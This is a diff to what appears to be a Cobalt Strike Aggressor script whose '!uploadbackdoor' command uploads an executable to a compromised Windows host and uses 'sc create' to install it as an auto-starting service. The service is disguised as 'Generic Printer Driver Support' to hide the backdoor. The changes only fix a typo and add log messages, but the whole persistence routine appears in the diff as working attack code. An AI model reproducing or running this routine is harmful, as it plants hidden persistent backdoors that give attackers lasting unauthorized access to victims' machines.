@@ -1,4 +1,4 @@
-# Uploads a persistent backdoor on a window becaon as a service
+# Uploads a persistent backdoor on a window beacon as a service
 # Go to Attacks -> Packages -> Windows Executeable (S)
 # Export a Windows Service EXE file
 # Save the exe, something like "GenericPrinterServices.exe" works
@@ -12,12 +12,14 @@ sub servicefilename {
 }
 
 command !uploadbackdoor {
-	println("\c4Uploading backdoor on beacon: $1 using file $2 ");
+	println("\c4Uploading backdoor on beacon $1 using file $2 ");
+	elog("Attempting to publish backdoor on beacon $1 ");
 	bcd($1, "C:\\Windows\\");
-	println("\c4Changed directory on beacon to C:\\Windows\\");
+	println("\c4Changed directory on beacon $1 to C:\\Windows\\");
 	bupload($1, script_resource("$2"));
 	servicefilename($2);
 	bshell($1, "sc create GenericPrinterDriver binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \"Generic Printer Driver Support\"");
 	bshell($1, "sc start GenericPrinterDriver");
-	elog("Backdoor service created on beacon $1 using $servicebackdoorfilename "); 
+	elog("Backdoor service created on beacon $1 using $servicebackdoorfilename ");
+	println("\c9[+] Backdoor creation complete!");
 }
